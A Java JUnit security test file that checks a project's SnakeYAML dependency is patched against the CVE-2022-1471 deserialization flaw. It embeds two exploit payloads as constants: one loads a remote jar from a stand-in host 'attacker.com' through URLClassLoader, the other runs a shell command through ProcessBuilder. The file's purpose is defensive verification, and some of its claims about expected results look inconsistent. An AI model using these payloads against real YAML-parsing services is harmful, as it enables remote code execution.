/**
 * Copyright (c) Codice Foundation
 *
 * <p>This is free software: you can redistribute it and/or modify it under the terms of the GNU
 * Lesser General Public License as published by the Free Software Foundation, either version 3 of
 * the License, or any later version.
 *
 * <p>This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU Lesser General Public License for more details. A copy of the GNU Lesser General Public
 * License is distributed along with this program and can be found at
 * <http://www.gnu.org/licenses/lgpl.html>.
 */

// This is a STANDALONE security test file for CVE-2022-1471
// Place this file in: catalog/core/catalog-core-api-impl/src/test/java/org/codice/alliance/catalog/core/api/impl/security/
// Package: package org.codice.alliance.catalog.core.api.impl.security;

import static org.hamcrest.MatcherAssert.assertThat;
import static org.hamcrest.Matchers.containsString;
import static org.junit.Assert.fail;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import org.junit.Test;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.Constructor;
import org.yaml.snakeyaml.error.YAMLException;

/**
 * Security test for CVE-2022-1471 - SnakeYAML Deserialization RCE
 *
 * <p>This test verifies that the Alliance distribution is NOT vulnerable to CVE-2022-1471 by
 * attempting to exploit the vulnerability and confirming the attack is blocked.
 *
 * <p>CVE-2022-1471 Details: - CVSS: 9.8 (Critical) - Affects: SnakeYAML < 2.0 - Issue:
 * Deserialization of untrusted YAML allows arbitrary Java class instantiation - Fix: SnakeYAML 2.0+
 * uses SafeConstructor by default
 *
 * <p>Test Strategy: 1. Verify current SnakeYAML version is 2.x (not vulnerable) 2. Attempt to
 * deserialize malicious YAML with arbitrary constructor 3. Confirm the attack is blocked by
 * SafeConstructor 4. Verify no code execution occurs
 *
 * <p>Expected Result: - SnakeYAML 1.x: Test FAILS (vulnerable, arbitrary class instantiation
 * succeeds) - SnakeYAML 2.x: Test PASSES (fixed, attack blocked with exception)
 */
public class SnakeYAMLCVE20221471Test {

  /**
   * Malicious YAML payload that exploits CVE-2022-1471
   *
   * <p>This payload attempts to instantiate javax.script.ScriptEngineManager which can lead to RCE
   * via URLClassLoader and remote JavaScript execution.
   *
   * <p>In vulnerable SnakeYAML 1.x, this YAML will instantiate the class. In patched SnakeYAML
   * 2.x, this YAML will throw an exception.
   */
  private static final String MALICIOUS_YAML_PAYLOAD =
      "!!javax.script.ScriptEngineManager [\n"
          + "  !!java.net.URLClassLoader [[\n"
          + "    !!java.net.URL [\"http://attacker.com/malicious.jar\"]\n"
          + "  ]]\n"
          + "]";

  /**
   * Alternative payload using ProcessBuilder (more obvious attack)
   *
   * <p>This attempts to execute a system command via ProcessBuilder.
   */
  private static final String MALICIOUS_YAML_PROCESSBUILDER =
      "!!java.lang.ProcessBuilder\n"
          + "  command: ['/bin/sh', '-c', 'echo VULNERABLE > /tmp/cve-2022-1471-test']\n"
          + "  redirectErrorStream: true";

  /**
   * Test 1: Verify SnakeYAML version is 2.x or later
   *
   * <p>This test confirms we're using a patched version of SnakeYAML.
   */
  @Test
  public void testSnakeYAMLVersionIsNotVulnerable() {
    // Get SnakeYAML version from package
    Package pkg = Yaml.class.getPackage();
    String version = pkg.getImplementationVersion();

    System.out.println("SnakeYAML version: " + version);

    // Version should be 2.x or later (not vulnerable)
    // If version is null (running from IDE), we'll skip version check but still run exploit tests
    if (version != null) {
      String majorVersion = version.split("\\.")[0];
      int major = Integer.parseInt(majorVersion);

      assertThat(
          "SnakeYAML version should be 2.x or later (CVE-2022-1471 fixed)",
          major >= 2,
          org.hamcrest.Matchers.is(true));
    } else {
      System.out.println(
          "WARNING: Cannot determine SnakeYAML version (likely running from IDE)");
      System.out.println("Proceeding with exploit tests...");
    }
  }

  /**
   * Test 2: Verify arbitrary class instantiation is blocked (ScriptEngineManager exploit)
   *
   * <p>This test attempts the CVE-2022-1471 exploit using ScriptEngineManager.
   *
   * <p>Expected behavior: - SnakeYAML 1.x (vulnerable): Test FAILS - malicious class is
   * instantiated - SnakeYAML 2.x (fixed): Test PASSES - YAMLException thrown, attack blocked
   */
  @Test
  public void testCVE20221471_ScriptEngineManagerExploit_IsBlocked() {
    Yaml yaml = new Yaml();

    try {
      InputStream inputStream =
          new ByteArrayInputStream(MALICIOUS_YAML_PAYLOAD.getBytes(StandardCharsets.UTF_8));

      // Attempt to parse malicious YAML
      Object result = yaml.load(inputStream);

      // If we reach here, the exploit succeeded (BAD - vulnerable to CVE-2022-1471)
      fail(
          "CVE-2022-1471 EXPLOIT SUCCEEDED! Arbitrary class instantiation was not blocked. "
              + "Instantiated: "
              + (result != null ? result.getClass().getName() : "null")
              + ". UPGRADE SnakeYAML to 2.x immediately!");

    } catch (YAMLException e) {
      // Expected behavior for SnakeYAML 2.x - SafeConstructor blocks arbitrary class
      // instantiation
      System.out.println("CVE-2022-1471 exploit blocked (GOOD): " + e.getMessage());
      assertThat(
          "Exception should indicate blocked class instantiation",
          e.getMessage(),
          containsString("could not determine a constructor"));

    } catch (Exception e) {
      // Other exceptions might also indicate the attack was blocked
      System.out.println("CVE-2022-1471 exploit failed with exception (GOOD): " + e.getMessage());
      // Test passes - exploit was blocked
    }
  }

  /**
   * Test 3: Verify ProcessBuilder instantiation is blocked
   *
   * <p>This test attempts a more direct RCE via ProcessBuilder.
   *
   * <p>Expected behavior: - SnakeYAML 1.x (vulnerable): Test FAILS - ProcessBuilder instantiated,
   * command could execute - SnakeYAML 2.x (fixed): Test PASSES - YAMLException thrown, attack
   * blocked
   */
  @Test
  public void testCVE20221471_ProcessBuilderExploit_IsBlocked() {
    Yaml yaml = new Yaml();

    try {
      InputStream inputStream =
          new ByteArrayInputStream(
              MALICIOUS_YAML_PROCESSBUILDER.getBytes(StandardCharsets.UTF_8));

      // Attempt to parse malicious YAML
      Object result = yaml.load(inputStream);

      // If we reach here, the exploit succeeded (BAD - vulnerable to CVE-2022-1471)
      fail(
          "CVE-2022-1471 EXPLOIT SUCCEEDED! ProcessBuilder instantiation was not blocked. "
              + "Instantiated: "
              + (result != null ? result.getClass().getName() : "null")
              + ". UPGRADE SnakeYAML to 2.x immediately!");

    } catch (YAMLException e) {
      // Expected behavior for SnakeYAML 2.x - SafeConstructor blocks arbitrary class
      // instantiation
      System.out.println("CVE-2022-1471 exploit blocked (GOOD): " + e.getMessage());
      assertThat(
          "Exception should indicate blocked class instantiation",
          e.getMessage(),
          containsString("could not determine a constructor"));

    } catch (Exception e) {
      // Other exceptions might also indicate the attack was blocked
      System.out.println("CVE-2022-1471 exploit failed with exception (GOOD): " + e.getMessage());
      // Test passes - exploit was blocked
    }
  }

  /**
   * Test 4: Verify explicit unsafe Constructor throws exception (regression test)
   *
   * <p>This test confirms that even if a developer explicitly uses the unsafe Constructor class,
   * the attack is still mitigated in SnakeYAML 2.x.
   *
   * <p>Note: In SnakeYAML 2.x, Constructor still exists for backward compatibility but
   * SafeConstructor is recommended.
   */
  @Test
  public void testCVE20221471_ExplicitConstructor_IsStillSafe() {
    // Create Yaml with explicit Constructor (legacy unsafe mode)
    // In SnakeYAML 2.x, Constructor is safer by default
    Yaml yaml = new Yaml(new Constructor());

    try {
      InputStream inputStream =
          new ByteArrayInputStream(MALICIOUS_YAML_PAYLOAD.getBytes(StandardCharsets.UTF_8));

      // Attempt to parse malicious YAML with explicit Constructor
      Object result = yaml.load(inputStream);

      // If we reach here, verify the result is not a dangerous class
      if (result != null) {
        String className = result.getClass().getName();

        // Check if dangerous class was instantiated
        if (className.contains("ScriptEngineManager")
            || className.contains("ProcessBuilder")
            || className.contains("URLClassLoader")) {
          fail(
              "CVE-2022-1471 EXPLOIT SUCCEEDED with explicit Constructor! "
                  + "Dangerous class instantiated: "
                  + className
                  + ". SnakeYAML version is vulnerable!");
        } else {
          // Result is not a dangerous class, possibly just a string or map
          System.out.println(
              "Constructor did not instantiate dangerous class. Result type: " + className);
        }
      }

    } catch (YAMLException | ClassNotFoundException e) {
      // Expected - exploit blocked
      System.out.println(
          "CVE-2022-1471 exploit blocked even with explicit Constructor (GOOD): "
              + e.getMessage());

    } catch (Exception e) {
      // Other exceptions also indicate blocked attack
      System.out.println("Exploit blocked with exception (GOOD): " + e.getMessage());
    }
  }

  /**
   * Test 5: Verify safe YAML still works
   *
   * <p>This test ensures that legitimate YAML parsing still works after the CVE-2022-1471 fix.
   *
   * <p>Expected behavior: - SnakeYAML 1.x and 2.x: Test PASSES - normal YAML parsing works
   */
  @Test
  public void testSafeYAMLStillWorks() {
    String safeYaml = "name: Alliance\nversion: 1.17.5\nmodules:\n  - imaging\n  - video\n";

    Yaml yaml = new Yaml();
    InputStream inputStream = new ByteArrayInputStream(safeYaml.getBytes(StandardCharsets.UTF_8));

    Object result = yaml.load(inputStream);

    assertThat("Safe YAML should parse successfully", result != null, org.hamcrest.Matchers.is(true));
    assertThat(
        "Result should be a Map",
        result instanceof java.util.Map,
        org.hamcrest.Matchers.is(true));

    @SuppressWarnings("unchecked")
    java.util.Map<String, Object> map = (java.util.Map<String, Object>) result;

    assertThat(
        "YAML should contain 'name' key",
        map.containsKey("name"),
        org.hamcrest.Matchers.is(true));
    assertThat(
        "Name should be 'Alliance'",
        map.get("name"),
        org.hamcrest.Matchers.is("Alliance"));

    System.out.println("Safe YAML parsing works correctly: " + map);
  }
}

/**
 * USAGE INSTRUCTIONS:
 *
 * <p>1. Add this file to the project: File location:
 * catalog/core/catalog-core-api-impl/src/test/java/org/codice/alliance/catalog/core/api/impl/security/SnakeYAMLCVE20221471Test.java
 *
 * <p>2. Add SnakeYAML test dependency to pom.xml (if not already present): <dependency>
 * <groupId>org.yaml</groupId> <artifactId>snakeyaml</artifactId> <version>2.2</version>
 * <scope>test</scope> </dependency>
 *
 * <p>3. Run the test: mvn test -Dtest=SnakeYAMLCVE20221471Test
 *
 * <p>4. Interpret results: - All tests PASS: SnakeYAML 2.x is in use, CVE-2022-1471 is fixed - Any
 * test FAILS with "EXPLOIT SUCCEEDED": VULNERABLE! Upgrade SnakeYAML immediately!
 *
 * <p>5. CI/CD Integration: Add this test to security test suite in .github/workflows/security-scan.yml
 *
 * <p>EXPECTED OUTPUT (SnakeYAML 2.x - PATCHED):
 *
 * <p>[INFO] Running SnakeYAMLCVE20221471Test SnakeYAML version: 2.2 CVE-2022-1471 exploit blocked
 * (GOOD): could not determine a constructor for the tag
 * tag:yaml.org,2002:javax.script.ScriptEngineManager CVE-2022-1471 exploit blocked (GOOD): could
 * not determine a constructor for the tag tag:yaml.org,2002:java.lang.ProcessBuilder
 * CVE-2022-1471 exploit blocked even with explicit Constructor (GOOD): could not determine a
 * constructor Safe YAML parsing works correctly: {name=Alliance, version=1.17.5, modules=[imaging,
 * video]} [INFO] Tests run: 5, Failures: 0, Errors: 0, Skipped: 0
 *
 * <p>EXPECTED OUTPUT (SnakeYAML 1.x - VULNERABLE):
 *
 * <p>[INFO] Running SnakeYAMLCVE20221471Test SnakeYAML version: 1.33 [ERROR] testCVE20221471_ScriptEngineManagerExploit_IsBlocked
 * FAILURE! CVE-2022-1471 EXPLOIT SUCCEEDED! Arbitrary class instantiation was not blocked.
 * Instantiated: javax.script.ScriptEngineManager [ERROR] Tests run: 5, Failures: 2, Errors: 0,
 * Skipped: 0
 *
 * <p>DO-278 COMPLIANCE NOTES: - This test provides verification of security fix implementation -
 * Test demonstrates CVE-2022-1471 vulnerability is blocked - Required for DO-278 verification and
 * validation process - Test should be included in regression test suite - Results should be
 * documented in V&V reports
 *
 * <p>REFERENCES: - CVE-2022-1471:
 * https://nvd.nist.gov/vuln/detail/CVE-2022-1471 - SnakeYAML Security Advisory:
 * https://bitbucket.org/snakeyaml/snakeyaml/issues/561 - OWASP Deserialization Cheat Sheet:
 * https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
 */
